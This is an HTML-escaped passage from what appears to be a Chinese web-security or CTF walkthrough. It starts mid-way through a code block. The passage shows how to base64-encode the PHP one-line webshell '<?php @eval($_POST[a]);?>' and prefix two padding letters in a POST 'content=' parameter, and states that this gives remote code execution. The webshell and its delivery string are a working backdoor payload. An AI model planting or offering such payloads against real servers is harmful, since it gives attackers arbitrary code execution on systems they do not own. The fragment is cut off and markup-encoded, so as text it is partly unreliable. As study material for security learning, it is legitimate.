&#34;&gt;33&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;65&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;37&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;36&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;38&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;37&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对一句话木马  &lt;code&gt;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&lt;/code&gt; 进行base64编码得到&lt;code&gt;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==&lt;/code&gt;并在前面加上两个字母&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;之后可实现远程代码执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
